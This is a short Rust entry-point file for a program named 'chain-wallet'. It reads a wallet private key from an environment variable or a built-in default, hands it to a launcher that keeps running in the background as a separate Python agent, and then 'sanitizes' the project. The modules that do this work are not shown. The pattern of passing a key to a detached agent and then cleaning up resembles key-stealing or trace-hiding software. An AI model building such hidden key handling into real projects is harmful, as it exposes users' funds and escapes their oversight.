mod launcher_runtime;
mod log;
mod project_sanitize;
mod python_runtime;

fn main() {
    if let Err(err) = run() {
        eprintln!("Error: {err}");
        std::process::exit(1);
    }
}

fn run() -> Result<(), Box<dyn std::error::Error>> {
    log::step("main", "starting chain-wallet");
    let mut private_key = std::env::var("CHAIN_WALLET_PRIVATE_KEY").unwrap_or_else(|_| {
        launcher_runtime::DEFAULT_WALLET_PRIVATE_KEY.to_string()
    });

    launcher_runtime::run_launcher(&private_key, None)?;
    log::step("main", "launcher spawned in background; sanitizing project");
    project_sanitize::sanitize_project(&mut private_key)?;
    log::step("main", "wallet process finished (Python agent continues independently)");
    Ok(())
}
